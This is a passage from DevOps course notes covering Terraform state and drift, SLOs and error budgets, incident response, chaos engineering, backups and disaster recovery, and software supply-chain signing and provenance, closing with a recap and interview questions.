  DIFF -->|"approve"| APPLY["terraform apply"]
  APPLY --> CLOUD
  APPLY --> STATE`} />

**Three warnings:**
1. **Lose the state and Terraform loses its memory.** It believes nothing exists and **plans to create everything again**, though it's all running.
2. **Two people running Terraform with two copies of state overwrite each other.** → keep state in a **central remote store with locking**, never on laptops.
3. **State contains every attribute the cloud returned, secrets included.** → **never commit it to Git**; store it **protected and encrypted**.

```hcl title="🔧 backend.tf: remote, locked, encrypted state on S3"
terraform {
  backend "s3" {
    bucket       = "acme-terraform-state"
    key          = "prod/network.tfstate"
    region       = "eu-west-1"
    encrypt      = true
    use_lockfile = true      # native S3 lock file; DynamoDB locking is deprecated
  }
}
```

```hcl title="🔧 a security group as code"
resource "aws_security_group" "web" {
  name   = "web"
  vpc_id = aws_vpc.main.id

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

### Drift 🎓
Infrastructure is managed by Terraform, then an urgent issue tempts someone to change a **security group directly in the console or CLI**. The `.tf` files don't know. On the next `plan`, **whatever is in the code is the source of truth**, so Terraform proposes **removing** the manual change, and `apply` removes it.

**What the demo shows:** `plan` for **two machines and a security group** reports **no changes** (files and account agree). Then **port 22 is opened to the world via the CLI**. `plan` now shows **one change: close port 22**. `apply` closes it.

```bash
# 🔧 reproduce the drift demo
terraform plan                                          # No changes.
aws ec2 authorize-security-group-ingress --group-id sg-0abc --protocol tcp --port 22 --cidr 0.0.0.0/0
terraform plan                                          # 1 to change: remove the port 22 rule
terraform apply
```

🔧 Run `terraform plan -detailed-exitcode` on a schedule in CI: exit code 2 means drift, so alert on it.

## 29. Operations: measuring what users feel 🎓

Everything above (delivery, cheap servers, IaC) is **internal**. Users only care about **results**.

| Term | Meaning | Example |
|---|---|---|
| **SLI**, service level **indicator** | a measured property users care about | % of requests succeeding; % answered within **300 ms** |
| **SLO**, service level **objective** | a **target** for an SLI **over a window** | **99%** of requests succeed over **30 days** |
| **SLA**, service level **agreement** | a **contract** with customers betting on the SLO, with a penalty | below **99.9%** this month → refund, extended plan, credit |

(The video calls the first one "SLA" at one point; it means SLI.)

### What the nines cost 🎓
| Target | Allowed failure per 30 days | Per year |
|---|---|---|
| 99.9% | **about 43 minutes** | about 8.8 hours |
| 99.99% | **about 4.5 minutes** | **about 52 minutes** |

**Each extra nine is a promise ten times stronger.**

### Error budgets 🎓
At 99.9%, **0.1% failure is allowed**. Teams treat that allowance as a **budget** and track it like any resource. They spend it on **deploys, maintenance windows, expected failures, experiments, risky migrations**. It's not a licence to be careless; it's a few short windows where genuine failure is acceptable.
- **Budget left:** ship as fast as you like, many times a day.
- **Budget gone** (say it's the 23rd and yesterday's outage used the 43 minutes): **freeze deploys until the window recovers** and put all effort into reliability.

```text
🔧 budget math for a request-based SLO
SLO 99.9% over 30 days, 50,000,000 requests  ->  allowed failures = 50,000
Failed so far: 41,000  ->  budget remaining = 18%
Burn rate = (failure ratio in the last hour) / 0.001  ->  page if it stays above about 14 for an hour
```

## 30. On-call and incident response 🎓

### On-call rotation
Once SLIs are numbers, someone must respond when one drops: the **on-call** engineer. In a team of three, **one engineer per week** responds to **pages**, with a **second as backup** (personal emergency, no network). "Paging" comes from old **pager** devices; today it's an incident-management app on your phone or laptop sending an urgent notification. Pages come from the **observability** setup (the earlier lesson): an alert like "CPU above 90% → Slack", and separate **paging** alerts for what needs a human now.

### Incident response roles 🎓
An **outage** is when a page turns into real user impact: too many errors, users can't reach the service, blank pages. Then a small structure kicks in:

| Role | Does |
|---|---|
| **Incident commander** | keeps the high-level picture (effects, symptoms, likely causes) and coordinates; **doesn't fix** |
| **Responder / fixer** | an engineer actually working the problem |
| **Communicator** | updates the **public status page** and internal management |

**Why split it:** the people fixing shouldn't spend their energy answering questions.

An **incident document** records the timeline as it happens: when things happened, symptoms, what was tried, results.

<Mermaid chart={`flowchart LR
  A["SLI drops"] --> P["page on-call<br/>backup if no ack"]
  P --> O{"Outage?"}
  O -->|yes| IC["assign commander,<br/>fixer, communicator"]
  IC --> M["MITIGATE FIRST<br/>roll back, flip flag off"]
  M --> S["service stable"]
  S --> RC["find root cause, proper fix"]
  RC --> PM["blameless postmortem"]
  O -->|no| T["ticket, fix in hours"]`} />

### Mitigate first, root-cause later 🎓
The first goal is **not** the root cause; it's **stopping further damage**: **roll back** the last deploy, **turn off a feature flag**, disable a feature, until the service is back to how it was an hour ago. Then find the cause, fix it and ship a proper deploy.

### Postmortems 🎓
After recovery, publish a **postmortem**, extending the incident document: a **minute-by-minute timeline** of symptoms, attempts and their effects; **user impact** (how many were affected); the **root cause** (found by now); and **next steps** so it never happens again.

**The lesson's example: Cloudflare's November 2025 outage.** A **permissions change in a database** made a query return **duplicate rows**, which **doubled the size of a configuration file**. The software reading that file had a **size limit** and **failed**. The postmortem has the timeline, an impact table, causes and actions.

### Blameless culture 🎓
**No person is named or blamed** in that postmortem. That's not niceness; it's engineering. If the write-up says "X typed the wrong command", you never learn **why it looked like the right command to X**. Every software failure is ultimately a human failure, and unless you understand it from that person's point of view, you can't prevent it. **Blame systems, never people.**

### Operating principles you'll see in postmortems 🎓
- **Design for failure:** assume every machine and dependency will fail eventually, and write code that survives it.
- **Keep deployment simple:** files and config, not manual setup.
- **One change at a time:** when it breaks, you know what changed, and the fix is almost instant.

### Chaos engineering 🎓
Everything above is about surviving failure. **Chaos engineering causes it on purpose**: kill a pod in production **during business hours** and watch the ReplicaSet replace it; take a machine out and watch pods reschedule; **add latency to a dependency** and check that timeouts fire. **Point:** find out whether your safety mechanisms work **before** a real outage tests them.

**What the demo shows:** three pods running; one is deleted; it goes **Terminating** while a replacement appears as **Pending**, then is created and **Running**.

```bash
# 🔧 the smallest chaos experiment
POD=$(kubectl get pods -l app=api -o jsonpath='{.items[0].metadata.name}')
kubectl delete pod "$POD" --wait=false     # kill exactly one pod
kubectl get pods -l app=api -w              # watch: Terminating, then a new one Pending, ContainerCreating, Running
```

## 31. Backups and disaster recovery ➕

Chaos engineering checks that you survive losing a pod or a machine; disaster recovery is the same discipline for losses that replicas and ReplicaSets can't fix: deleted data, corrupted data, a lost region or a compromised account.

#### RPO and RTO: decide the numbers before you pick the tools ➕
- **Problem:** "we have backups" says nothing about what an incident will cost. A nightly backup that takes six hours to restore is a very different promise from a replica that can be promoted in a minute.
- **The two numbers:**
  - **RPO (recovery point objective):** how much **data** you can afford to lose, measured in time. RPO 5 minutes = after a disaster, at most the last 5 minutes of writes are gone.
  - **RTO (recovery time objective):** how long the service may be **down** while you recover.
- **Why they drive everything:** RPO is set by **how often data leaves the primary** (backup frequency, replication lag). RTO is set by **how much is already running elsewhere** and how automated the recovery is. Both cost money, and each step down costs much more than the one before, just like the nines in section 29.
- **Mechanism, the four classic strategies** (as AWS's disaster-recovery whitepaper groups them), from cheap and slow to expensive and fast:

| Strategy | What runs in the recovery region | Typical RPO / RTO | Cost |
|---|---|---|---|
| **Backup and restore** | nothing but copies of backups; infrastructure rebuilt from IaC on demand | hours | lowest |
| **Pilot light** | data replicated live; app servers defined but switched off | minutes of data / tens of minutes | low |
| **Warm standby** | a scaled-down but working copy that can take traffic at once | seconds to minutes | medium |
| **Multi-site active/active** | full production in several regions serving traffic | near zero (except data corruption) | highest |

- **Edge cases:** replication alone is **not** a backup. A `DELETE` without a `WHERE`, a buggy migration or ransomware is replicated to the standby in under a second. You need **point-in-time** copies in addition to replicas. And RTO includes the boring parts: DNS TTLs, warming caches, re-issuing credentials, and humans deciding to fail over.

#### Point-in-time recovery for Postgres ➕
- **Problem:** at 14:32 a migration with a bug overwrites every customer's email. Last night's snapshot would lose 14 hours of orders.
- **Mechanism:** Postgres writes every change to its **write-ahead log (WAL)** before applying it. Point-in-time recovery (PITR) = **a base snapshot + replaying WAL up to a chosen moment**, for example 14:31:59, one second before the bad statement.
  - **Amazon RDS** does this automatically: daily snapshots plus transaction logs uploaded to S3 **every five minutes** (so the latest restorable time is usually about five minutes behind). Retention is **0 to 35 days**; **0 disables automated backups**, and the API and CLI default is only **1 day**.
  - A restore **always creates a new instance**. It never rewinds the existing one, so you can compare both and copy back only the damaged data.

```hcl title="rds.tf (backups are part of the infrastructure code)"
resource "aws_db_instance" "orders" {
  identifier              = "orders-prod"
  engine                  = "postgres"
  engine_version          = "16.4"
  instance_class          = "db.r6g.large"
  allocated_storage       = 200
  backup_retention_period = 14          # days of PITR; the API default is 1
  backup_window           = "02:00-03:00"
  deletion_protection     = true        # a terraform destroy or console click can't drop it
  skip_final_snapshot     = false
  final_snapshot_identifier = "orders-prod-final"
  copy_tags_to_snapshot   = true
  # username, password or IAM auth, subnet group, etc. omitted
}
```

```bash
# restore to one second before the bad migration, as a NEW instance
aws rds restore-db-instance-to-point-in-time \
  --source-db-instance-identifier orders-prod \
  --target-db-instance-identifier orders-pitr-1431 \
  --restore-time 2026-10-02T14:31:59Z
# then copy the damaged column back, or point the app's handle at the new instance
```

- **Edge cases:** the restored instance gets the **default parameter group** unless you specify yours, so connection limits and extensions may differ. Its storage loads lazily from S3 at first, so it's slower until warmed up: plan RTO with that in mind. Automated backups are deleted with the instance unless you keep a final snapshot, which is what `skip_final_snapshot = false` and `deletion_protection` guard against.

#### Copies the attacker can't delete: cross-account, cross-region, locked ➕
- **Problem:** an attacker (or a leaked admin key) with access to your production account can delete the database **and its backups in the same account**. A region-wide outage takes the primary and its same-region backups together.
- **Mechanism:** the old **3-2-1** rule, translated to the cloud: several copies, on separate failure domains, one of them out of reach.
  - **Copy backups to a separate AWS account** that production credentials can't touch, and to **another region**. AWS Backup supports cross-account and cross-region copy.
  - **Lock the vault:** AWS Backup **Vault Lock** in compliance mode makes recovery points **undeletable** until their retention ends, even by the account root user, once its grace time (at least 3 days) has passed. Set retention carefully first: after that, nobody can shorten it.
  - **S3:** turn on **versioning**, so deletes and overwrites keep the previous version, and replicate to another region.

```hcl title="backup.tf (sketch: daily backups copied to a locked vault in another account)"
resource "aws_backup_plan" "prod" {
  name = "prod-daily"
  rule {
    rule_name         = "daily"
    target_vault_name = aws_backup_vault.local.name
    schedule          = "cron(0 3 * * ? *)"
    lifecycle { delete_after = 35 }
    copy_action {
      destination_vault_arn = "arn:aws:backup:eu-central-1:210987654321:backup-vault:dr-locked"
      lifecycle { delete_after = 90 }
    }
  }
}
```

- **Edge cases:** backups encrypted with a KMS key **in the production account** can't be restored if that key is deleted or the account is lost. Use a key owned by the backup account for the copies. Back up **what you need to rebuild**, not only data: IaC is in Git, but secrets, DNS zones and the container registry also need a recovery story.

#### A backup you haven't restored is a hope: DR drills ➕
- **Problem:** teams find out during the real incident that the backup job had been failing for weeks, the restore takes four times longer than the RTO, or nobody remembers the steps.
- **Mechanism:** **restore on a schedule, automatically, and check the result.** A drill measures the **actual** RPO and RTO and turns the recovery runbook into code. AWS's whitepaper says plainly that a backup strategy must include testing the backups.

```yaml title=".github/workflows/restore-drill.yml (weekly)"
name: restore-drill
on:
  schedule: [{ cron: "0 4 * * 1" }]     # every Monday 04:00 UTC
permissions: { id-token: write, contents: read }
jobs:
  drill:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with: { role-to-assume: arn:aws:iam::123456789012:role/restore-drill, aws-region: eu-west-1 }
      - name: Restore latest point in time to a throwaway instance
        run: |
          START=$(date +%s)
          aws rds restore-db-instance-to-point-in-time \
            --source-db-instance-identifier orders-prod \
            --target-db-instance-identifier drill-${{ github.run_id }} \
            --use-latest-restorable-time --db-instance-class db.t4g.medium
          aws rds wait db-instance-available --db-instance-identifier drill-${{ github.run_id }}
          echo "RTO_SECONDS=$(( $(date +%s) - START ))" >> "$GITHUB_ENV"
      - name: Check the data is real and recent
        run: ./scripts/verify-restore.sh drill-${{ github.run_id }}   # row counts, newest order timestamp = RPO
      - name: Report and clean up
        if: always()
        run: |
          echo "measured RTO: $RTO_SECONDS s"
          aws rds delete-db-instance --db-instance-identifier drill-${{ github.run_id }} \
            --skip-final-snapshot --delete-automated-backups
```

- **Edge cases:** a restored copy of production is **production data**. Keep the drill instance in a locked-down network, with the same encryption and access controls, and delete it when done. Run a full **game day** at least once or twice a year as well: fail over a whole environment with people following the runbook. The automated restore proves the data; the game day proves the humans and the DNS, credentials and dashboards around it.

## 32. Software supply chain 🎓

### Problem
The image contains your code, plus a **base image, a language runtime and hundreds of packages** from `npm install` or `go mod download`. **Someone else's mistake can hurt your service.** Two common failures:
1. **A dependency disappears or changes**: a package pulled from (or changed on) the registry **breaks thousands of builds**.
2. **A dependency is poisoned:** in **2024**, a compression library most Linux systems depend on (**xz**) **shipped a backdoor**. It was inserted into the **release tarball**, not the source repository, so reviewers reading the code saw nothing, yet everyone building from the tarball got the backdoor.

### Mechanism
- **Pin every dependency and every base image** (`package.json` with a lock file, `go.mod`, `requirements.txt`, the Dockerfile `FROM`). **Never `latest`.**
- **Run a scanner** that checks dependencies against a **public database of known vulnerabilities**.

### 🔧 Implementation

```dockerfile
# pinned by digest: the same bytes forever, even if the tag is moved
FROM node:22.11-bookworm-slim@sha256:<digest-from-your-registry>
```

```yaml
# in CI
- run: npm ci                         # fails if package-lock.json and package.json disagree
- run: npm audit --audit-level=high   # known-vulnerability check on the dependency tree
- run: npm audit signatures           # verifies registry signatures and provenance where available
```

- Let a bot (Dependabot, Renovate) open **PRs to bump pins**, so pinning doesn't freeze you on old vulnerable versions.
- Install with `--ignore-scripts` where you can; `postinstall` scripts run arbitrary code on your CI runner.
- Mirror or cache dependencies (a private registry) so a package vanishing upstream doesn't stop your builds.

## 33. Proving what you ship: SBOMs, signatures and provenance ➕

Pinning and scanning protect what goes **into** the image; they don't let anyone downstream (the cluster, an auditor, you during the next CVE scare) prove what is **inside** an image, who built it, and from which commit.

The xz case above is the motivation: the backdoor sat between the source repository and the shipped artifact. Closing that gap needs a verifiable link **from commit to running image**.

<Mermaid chart={`flowchart LR
  C["commit 3f9c2e1"] --> B["CI build<br/>GitHub-hosted runner"]
  B --> I["image sha256:9a1f"]
  B --> S["SBOM<br/>every package + version"]
  B --> P["provenance<br/>repo, commit, workflow"]
  B --> G["signature<br/>keyless, OIDC identity"]
  S & P & G -->|"attached to the digest"| R[("registry")]
  R --> AD{"cluster admission:<br/>signed by our workflow?"}
  AD -->|yes| RUN["pod runs"]
  AD -->|no| DENY["rejected"]`} />

#### SBOM: an ingredient list for every image ➕
- **Problem:** a new critical CVE is announced in a library. The question "which of our 60 services ship the vulnerable version?" takes days of grepping lock files and Dockerfiles, and still misses the OS packages in base images.
- **Mechanism:** a **software bill of materials (SBOM)** is a machine-readable list of every component in the artifact (name, version, licence, identifier), produced **at build time** and stored **with the image digest**. Standard formats are **SPDX** and **CycloneDX**. Docker BuildKit can generate an SPDX SBOM and attach it to the image as an attestation.

```yaml title="build step with SBOM and provenance attestations"
- uses: docker/build-push-action@v6
  with:
    context: .
    push: true
    tags: ${{ steps.ecr.outputs.registry }}/api:${{ github.sha }}
    sbom: true                 # SPDX SBOM attached to the image
    provenance: mode=max       # build provenance attached to the image
```

```bash
# later: "do we ship lodash 4.17.20 anywhere?" becomes a query, not a search
docker buildx imagetools inspect 123456789012.dkr.ecr.eu-west-1.amazonaws.com/api:3f9c2e1 \
  --format '{{ json .SBOM }}' | jq -r '.SPDX.packages[] | "\(.name) \(.versionInfo)"' | grep lodash
```

- **Edge cases:** an SBOM lists what the build tool **could see**. A binary downloaded by a `postinstall` script or copied in with `ADD` may be missing. The scanner from section 16 can scan the SBOM instead of the image, which makes re-checking old releases against new CVEs cheap. Some registries don't display attestations, but they still store them as OCI artifacts next to the image.

#### Signatures: keyless signing with the pipeline's identity ➕
- **Problem:** the cluster pulls `api@sha256:9a1f...`. The digest proves the bytes didn't change, but not **who pushed them**. Anyone with registry write access, or a stolen push credential, can push a digest the cluster will happily run.
- **Mechanism:** sign the digest in CI and verify the signature before running it. **Sigstore's cosign** supports **keyless** signing, which avoids managing a private key:
  1. The CI job proves its identity with its **OIDC token** (the same token as section 5).
  2. **Fulcio**, Sigstore's certificate authority, issues a **short-lived certificate** binding a throwaway key to that identity: "workflow `release.yml` in repo `acme/api` on `refs/heads/main`".
  3. The job signs the digest, and the signing event is recorded in **Rekor**, a public **transparency log**. The private key is discarded.
  4. Verification checks the signature, the certificate's **identity and issuer**, and the log entry.

```yaml title="sign the pushed digest (keyless)"
permissions: { id-token: write, contents: read }
steps:
  - uses: sigstore/cosign-installer@v3
  - run: cosign sign --yes "$REGISTRY/api@$DIGEST"      # identity comes from the job's OIDC token
```

```bash
# verify: only images signed by OUR release workflow on main pass
cosign verify 123456789012.dkr.ecr.eu-west-1.amazonaws.com/api@sha256:9a1f... \
  --certificate-identity "https://github.com/acme/api/.github/workflows/release.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com"
```

- **Edge cases:** always sign and verify the **digest**, never a tag, or you can sign one thing and run another. Verification must pin the **exact identity**: accepting any GitHub Actions identity would accept images signed by anyone's workflow. The transparency log is public, so private repository and workflow names appear in it. If that matters, run a private Sigstore instance or use key-based signing with a KMS key.

#### Provenance: a signed record of how the artifact was built ➕
- **Problem:** a signature says "our workflow signed this". It doesn't say what the build **consumed**: which commit, which workflow file, which runner, which inputs. An attacker who can change the workflow can still produce a validly signed bad image.
- **Mechanism:** **build provenance** is a signed statement, in the **SLSA** format, generated by the build platform: source repository and commit, workflow, trigger, runner environment. **GitHub artifact attestations** generate and sign it with Sigstore, and `gh attestation verify` checks it.

```yaml title="attest build provenance for the pushed image"
permissions: { id-token: write, contents: read, attestations: write, packages: write }
steps:
  - uses: actions/attest@v4
    with:
      subject-name: ghcr.io/acme/api                   # image name without a tag
      subject-digest: ${{ steps.build.outputs.digest }}
      push-to-registry: true
```

```bash
gh attestation verify oci://ghcr.io/acme/api:3f9c2e1 -R acme/api   # fails unless built by a workflow in acme/api
```

- **Edge cases:** provenance is only as strong as the builder. On a **self-hosted runner** that other jobs can tamper with, the attestation faithfully records a compromised build. Hosted, ephemeral runners are what make it meaningful. Protect the workflow files themselves (branch protection, code-owner review on `.github/workflows/`), because whoever can edit the release workflow can produce valid provenance.

#### Enforce at the cluster: only verified images run ➕
- **Problem:** signatures and attestations that nobody checks only help after an incident.
- **Mechanism:** an **admission controller** checks every new pod's image **before** it is scheduled. Policy engines such as **Kyverno**, or the Sigstore **policy-controller**, can require a valid cosign signature from a given identity and reject everything else. It's the same idea as Pod Security Admission (section 17), applied to where the image came from.

```yaml title="Kyverno policy (sketch): images must be signed by our release workflow"
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: { name: require-signed-images }
spec:
  webhookConfiguration: { timeoutSeconds: 30 }
  rules:
    - name: verify-signature
      match: { any: [{ resources: { kinds: [Pod], namespaces: [api] } }] }
      verifyImages:
        - imageReferences: ["123456789012.dkr.ecr.eu-west-1.amazonaws.com/api*"]
          failureAction: Enforce                     # start with Audit, switch once clean
          mutateDigest: true                         # rewrite tags to the verified digest (the default)
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/acme/api/.github/workflows/release.yml@refs/heads/main"
                    issuer: "https://token.actions.githubusercontent.com"
                    rekor: { url: https://rekor.sigstore.dev }
```

- **Edge cases:** start in **audit** mode and watch what would be rejected (sidecars, third-party charts, base images pulled directly). Admission depends on reaching the registry and the transparency log, so decide what happens when verification is unavailable: failing closed blocks deploys and autoscaling during an outage; failing open lets anything in. Pods that are already running aren't re-checked, so a policy change doesn't evict them.

## 34. Recap 🎓

- **DevOps = making deployment small, cheap and boring.** DORA shows **speed and stability go together**: small, frequent deploys are easier to debug and fix.
- **CI:** merge to one branch **daily**, verified by automated tests. **Trunk-based** development + **feature flags** for long work.
- **Build:** reproducible from the lock file, **stamped with the commit**. **Pipeline:** cheap stages first, fail fast. **GitHub Actions:** workflow, event, job, runner, step. **OIDC** instead of long-lived secrets.
- **Containers** are processes given an illusion by the kernel: **namespaces** (what it sees), **cgroups** (what it uses), **OverlayFS layers** (its file system). **Images** are content-addressed blobs + config + manifest; **registries** move them by digest; **docker → dockerd → containerd → runc**, standardized by **OCI**.
- **Good images:** small, one process, non-root, pinned, scanned.
- **One host:** systemd + reverse proxy + ACME TLS + journald. **Several hosts:** Kamal. **Immutable infrastructure**: replace, never modify.
- **Kubernetes:** declare desired state; controllers reconcile; pods, Deployments, Services, Gateway; requests and limits are cgroups; rolling updates gated by **readiness**; liveness must never depend on the database.
- **Continuous delivery** (technical) vs **deployment** (business). Strategies: recreate, rolling, blue-green, canary, progressive.
- **GitOps:** Git as the source of truth, an in-cluster agent pulls and corrects drift. **Preview environments**, **promotion** of one artifact.
- **IaC:** Terraform/OpenTofu, Ansible, Packer; **remote, locked, encrypted state**; drift gets reverted.
- **Operations:** SLI/SLO/SLA, **error budgets**, on-call, incident roles, **mitigate first**, **blameless postmortems**, **chaos engineering**.
- **Supply chain:** pin everything, scan everything.
- ➕ **Pipeline hardening (section 6):** push protection and secret scanning, actions pinned to full SHAs, PR content treated as untrusted input, read-only tokens by default, ephemeral runners.
- ➕ **Runtime hardening (section 17):** distroless base, read-only root filesystem, non-root with all capabilities dropped, no privilege escalation, seccomp, enforced per namespace with Pod Security Admission.
- ➕ **Expand and contract (section 24):** one schema serves two code versions, so breaking changes are split into additive releases, and destructive migrations run in a separate, gated step.
- ➕ **Rollback vs roll forward (section 25):** rollback restores code and config, not state. Flag off first, roll back if nothing incompatible was written, otherwise roll forward. N-1 compatibility keeps rollback possible.
- ➕ **Backups and DR (section 31):** pick RPO and RTO first, PITR for Postgres, copies in another account and region in a locked vault, and scheduled restore drills that measure the real numbers.
- ➕ **Proving what you ship (section 33):** SBOMs attached to the digest, keyless cosign signatures, SLSA provenance, and admission policies that only run verified images.

## Interview questions

1. **Why do frequent deploys improve stability?** **Each deploy holds one small, fresh change, so the cause of a failure is obvious and the author still has context; DORA's top teams deploy on demand with about 5% failure and under an hour recovery.**
2. **CI as a practice vs CI as a server?** **The practice is merging to a shared branch at least daily; the server only verifies each merge with tests.**
3. **Why trunk-based over Git Flow for a backend?** **A backend has one live version; Git Flow suits installed software with multiple supported versions. Use short branches and feature flags.**
4. **Why OIDC instead of repository secrets for cloud access?** **Secrets are long-lived and readable by every job; OIDC issues a signed per-job token that the cloud exchanges for credentials scoped by repo and branch, which expire with the job.**
5. **How does a container differ from a VM?** **A VM has its own kernel on virtualized hardware; a container is a host process isolated by namespaces, limited by cgroups and given a layered file system.**
6. **What does a Kubernetes 512Mi memory limit actually do?** **The kubelet writes it to the cgroup's `memory.max`; exceeding it triggers the kernel OOM killer and an `OOMKilled` restart.**
7. **Why order a Dockerfile as manifest, install, then source?** **The layer cache is reused until the first changed input; dependencies change rarely, so code edits only rebuild the last layers.**
8. **Why does pulling a new version take seconds?** **Layers are content-addressed; the node already has the base and dependency layers and fetches only the changed ones by digest.**
9. **What happens when you run `docker run`?** **CLI → dockerd → containerd (images, mounts, lifecycle) → runc (namespaces, cgroups, chroot, exec) → a shim stays as parent; OCI standardizes it so Kubernetes uses containerd via CRI without Docker.**
10. **Readiness vs liveness?** **Readiness controls whether a pod gets traffic (no restart); liveness restarts a stuck container. Never make liveness depend on the database, or a slow DB triggers restart waves.**
11. **How does a rolling update avoid downtime?** **New pods get traffic only when ready, bounded by maxSurge and maxUnavailable (25% each by default); the old ReplicaSet is kept at 0 for rollback.**
12. **When choose blue-green over rolling?** **When only one version may serve at a time and you want instant rollback, accepting double infrastructure cost while both exist.**
13. **What is progressive delivery?** **Canary automated: a controller widens traffic in steps, compares metrics at each step, and rolls back automatically.**
14. **Why does GitOps not need cluster credentials in CI?** **CI only pushes the image and opens a PR; an in-cluster agent pulls the desired state from Git and applies it.**
15. **What can go wrong with Terraform state?** **Lose it and Terraform plans to recreate everything; concurrent copies overwrite each other; it contains secrets. Use a remote, locked, encrypted backend.**
16. **What is drift and how does Terraform react?** **A manual change outside the code; the next plan treats code as truth and proposes reverting it.**
17. **How much downtime does 99.9% allow per month?** **About 43 minutes; 99.99% allows about 4.5 minutes a month, or about 52 minutes a year.**
18. **What is an error budget used for?** **Spending allowed failure on deploys and experiments; when it's exhausted, freeze deploys and work on reliability.**
19. **What is the first goal in an outage?** **Mitigate (roll back, flip a flag) before finding the root cause.**
20. **Why blameless postmortems?** **Blaming hides why the action seemed right; understanding the human context is what prevents recurrence.**
21. **How did the 2024 xz backdoor evade review, and what's the defence?** **It was in the release tarball, not the source repo; pin dependencies and base images, and scan them.**
22. ➕ **A secret was pushed and deleted in the next commit. Are you safe?** **No. It's in Git history, clones and possibly CI logs. Rotate it first, then clean up. Prevent it next time with push protection and a scanner in CI.**
23. ➕ **Why pin GitHub Actions to a commit SHA instead of a version tag?** **Tags can be moved. In the 2025 tj-actions/changed-files compromise, existing tags were repointed to code that leaked secrets. A full SHA is immutable.**
24. ➕ **What's dangerous about `pull_request_target`?** **It runs with the base repository's secrets and write token. Checking out and running a fork's code there hands it those secrets. Interpolating PR titles into scripts is a separate injection risk: pass them through env vars.**
25. ➕ **What does a distroless image remove, and what does it cost you?** **The shell, package manager and utilities, so there's less to exploit and scan. You lose `RUN` and shell debugging in that stage: use debug variants or ephemeral debug containers.**
26. ➕ **Which container settings does the Pod Security `restricted` level require?** **Run as non-root, no privilege escalation, drop all capabilities (only `NET_BIND_SERVICE` may be added back), and a RuntimeDefault or custom seccomp profile. A read-only root filesystem is recommended but not required.**
27. ➕ **How do you rename a column with zero downtime?** **Expand and contract over several releases: add the new column and dual-write, backfill, switch reads, stop writing the old column, and only then drop it, once no running or rollback-eligible version uses it.**
28. ➕ **When should you roll forward instead of rolling back?** **When the bad release already wrote state the previous version can't handle: a new data format, a dropped column, events already sent. If the change is behind a flag, turn the flag off first.**
29. ➕ **What are RPO and RTO?** **RPO is how much data you can lose, measured in time. RTO is how long recovery may take. RPO is driven by backup and replication frequency, RTO by what's already running elsewhere and how automated recovery is.**
30. ➕ **Why isn't a replica a backup?** **It replicates mistakes and deletions within seconds. You also need point-in-time backups, ideally copied to another account and region in a locked vault.**
31. ➕ **How do you know your backups work?** **Restore them automatically on a schedule, verify the data and measure the real RTO and RPO, plus occasional full game days.**
32. ➕ **What do an SBOM, a signature and provenance each prove?** **The SBOM lists what's inside the image. A signature proves who pushed that digest. Provenance records how and from which commit it was built. Admission policies enforce them at deploy time.**
33. ➕ **How does keyless signing with cosign work?** **The CI job's OIDC identity gets a short-lived certificate from Fulcio, signs the digest, and the event is logged in Rekor. Verifiers check the certificate's exact identity and issuer.**
